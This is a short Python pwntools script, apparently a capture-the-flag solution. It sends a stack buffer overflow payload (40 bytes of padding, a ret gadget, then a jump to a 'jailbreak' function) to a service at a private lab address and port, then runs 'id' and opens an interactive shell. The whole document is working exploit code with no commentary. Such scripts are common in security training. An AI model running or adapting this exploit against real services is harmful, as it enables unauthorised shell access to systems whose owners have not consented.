from pwn import *

io = remote('10.42.5.10', 1337)

ret_gadget = p64(0x4011f1) 
jailbreak = p64(0x401156)

payload = b"A" * 40 + ret_gadget + jailbreak

io.sendlineafter(b"today?", payload)

io.sendline(b"id") 
io.interactive()
